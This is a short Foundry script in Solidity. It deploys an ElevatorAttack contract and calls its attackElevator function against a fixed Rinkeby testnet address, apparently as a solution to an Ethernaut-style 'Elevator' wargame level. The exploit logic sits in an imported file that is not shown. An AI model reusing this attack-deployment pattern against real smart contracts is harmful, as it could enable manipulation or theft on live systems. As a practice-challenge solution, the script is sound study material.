// SPDX-License-Identifier: MIT
pragma solidity ^0.8.15;

import { Script } from "forge-std/script.sol";

import { ElevatorAttack } from "src/Elevator/ElevatorAttack.sol";

contract ElevatorAttackScript is Script {
    // affected contract:
    // https://rinkeby.etherscan.io/address/0x6d0dd70bd1955edcc23637cf1146f16caa8210dc#internaltx
    function run() public {
        vm.startBroadcast();
            ElevatorAttack attacker = new ElevatorAttack();
            attacker.attackElevator(address(0x6d0DD70bD1955edCC23637cf1146F16Caa8210dC));
        vm.stopBroadcast();
    }
}